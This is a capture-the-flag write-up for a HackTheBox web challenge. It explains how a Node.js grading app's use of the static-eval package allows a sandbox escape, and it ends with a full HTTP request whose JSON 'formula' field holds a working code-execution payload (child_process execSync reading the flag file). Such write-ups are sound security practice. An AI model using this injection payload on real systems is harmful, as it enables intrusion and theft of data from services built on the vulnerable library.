# baby breaking grad

Completed: Yes
Platform: HackTheBox

You have one button, which sends JSON data and you receive the result of the exam or something. You have also source code. Let's check it.

```jsx
const evaluate = require('static-eval');
const parse = require('esprima').parse;

module.exports = {
    isDumb(name){
        return (name.includes('Baker') || name.includes('Purvis'));
    },

    hasPassed({ exam, paper, assignment }, formula) {
        let ast = parse(formula).body[0].expression;
        let weight = evaluate(ast, { exam, paper, assignment });

        return parseFloat(weight) >= parseFloat(10.5);
    }
};
```

evaluate function seems similar to eval, but it is not. It is different. And if you look at the imports, you'll find static-eval inclusion, which is what we need to complete the challenge. The program is simple. Just checks the name and calculates the given values, you can prove it with this code:

```jsx
const randomize         = require('randomatic');
const path              = require('path');
const express           = require('express');
const router            = express.Router();
const StudentHelper     = require('../helpers/StudentHelper');

router.get('/', (req, res) => {
    return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/calculate', (req, res) => {
    let student = req.body;

    if (student.name === undefined) {
        return res.send({
            error: 'Specify student name'
        })
    }

    let formula = student.formula || '[0.20 * assignment + 0.25 * exam + 0.25 * paper]';

    if (StudentHelper.isDumb(student.name) || !StudentHelper.hasPassed(student, formula)) {
        return res.send({
            'pass': 'n' + randomize('?', 10, {chars: 'o0'}) + 'pe'
        });
    }

    return res.send({
        'pass': 'Passed'
    });
});

module.exports = router;
```

You either specify the formula yourself or the program will specify it itself. Also, you can see if statement with two conditions, first checks if your name includes some names, and second checks if you pass or not based on the formula and values you will give in JSON data. Thus, if you specify a different name from Baker or Purvis, and then you specify a formula with the values of your choice, you maybe will pass. But this case will not give you a flag. From source code, you can find out that the flag contains on the machine and you have to get it through some gained access or code execution. That's why I talked about `evaluate` above. Just find the source code of the module or what is it (I'm not familiar with JS in detail). [https://github.com/browserify/static-eval](https://github.com/browserify/static-eval). If you check its issues and pull requests, you can find this pull request with the example of exploitation: [https://github.com/browserify/static-eval/pull/27/commits/6b7b9609d770948ec9e8a8dedeee5e55891459a3](https://github.com/browserify/static-eval/pull/27/commits/6b7b9609d770948ec9e8a8dedeee5e55891459a3).

At this point, you have all for arbitrary code execution. But if you won't specify a different name from Baker and Purvis, you won't go to the point with the formula. Thus, specify different names and formula keys in JSON. To find out how to execute something in OS through JS check this: [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/). Okay, now you see, that if you specify a different name, you will go to the code with formula, but how to return the value of the flag? That's why you need to try to break this code firstly and see that it return Exceptions. This is the vector. To throw exceptions in JS use `throw new Error()`. Thus, you now have all that you need to successfully exploit the vulnerable module. My request with payload is:

```bash
POST /api/calculate HTTP/1.1
Host: 139.59.166.56:30624
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://139.59.166.56:30624/
Content-Type: application/json
Origin: http://139.59.166.56:30624
Content-Length: 172
Connection: close

{"name":"lol",
"formula":  "(function(){ return `${eval(\"throw new Error(global.process.mainModule.constructor._load('child_process').execSync('cat flag*'))\")}` })()"
}
```